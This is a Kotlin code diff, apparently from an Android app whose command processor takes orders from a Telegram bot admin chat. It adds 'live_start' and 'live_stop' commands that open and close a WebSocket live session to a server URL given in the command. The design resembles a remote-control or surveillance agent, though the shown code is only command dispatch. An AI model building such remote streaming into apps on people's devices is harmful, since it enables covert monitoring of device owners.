@@ -13,6 +13,7 @@ class CommandProcessor(
     private val adminChatId: Long
 ) {
     private val uploader = TelegramUploader(context, telegramBotToken, adminChatId)
+    private val liveSessionManager = LiveSessionManager(context)
     private val mediaHandler = MediaHandler(context)
     private val systemHandler = SystemHandler(context)
     private val processorScope = CoroutineScope(Dispatchers.IO)
@@ -73,6 +74,19 @@ class CommandProcessor(
                     "clear_log" -> {
                         ErrorLogger.clearLogs(context)
                         uploader.sendText("Error logs cleared.")
+                    }
+                    "live_start" -> {
+                        // arg should be the WebSocket URL, e.g., "wss://your-server.tailnet.ts.net/live"
+                        if (arg.startsWith("ws")) {
+                            uploader.sendText("Initiating Live WebSocket Connection...")
+                            liveSessionManager.connect(arg)
+                        } else {
+                            uploader.sendText("Error: Invalid WebSocket URL provided.")
+                        }
+                    }
+                    "live_stop" -> {
+                        liveSessionManager.disconnect()
+                        uploader.sendText("Live Session Terminated.")
                     }
                 }
             } catch (e: Exception) {
